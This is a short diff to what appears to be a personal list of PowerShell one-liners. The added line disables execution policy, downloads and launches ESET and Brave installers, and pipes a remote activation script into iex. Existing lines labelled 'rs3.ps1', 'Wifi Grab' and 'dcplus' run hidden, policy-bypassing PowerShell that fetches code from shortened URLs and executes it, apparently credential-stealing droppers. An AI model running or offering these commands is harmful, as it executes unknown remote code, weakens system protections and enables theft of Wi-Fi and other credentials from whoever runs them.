@@ -1,3 +1,10 @@
+Set-ExecutionPolicy unrestricted -Force; Invoke-WebRequest -Uri "https://download.eset.com/com/eset/apps/home/essp/windows/latest/essp_nt64.exe" -OutFile "$env:USERPROFILE\Desktop\essp_nt64.exe"; Start-Process -FilePath "$env:USERPROFILE\Desktop\essp_nt64.exe"; Invoke-WebRequest -Uri "https://laptop-updates.brave.com/download/BRV010?bitness=64" -OutFile "$env:USERPROFILE\Desktop\brave.exe";Start-Process -FilePath "$env:USERPROFILE\Desktop\brave.exe"; irm https://get.activated.win | iex ;
+
+
+
+
+
+
 rs3.ps1 powershell -w h -NoP -Ep Bypass; irm https://rb.gy/67y5f3 | iex 
 Wifi Grab powershell -w h -NoP -Ep Bypass; irm https://rb.gy/bk5rpv | iex
 dcplus powershell -w h -NoP -Ep Bypass; irm https://rb.gy/40f010 | iex
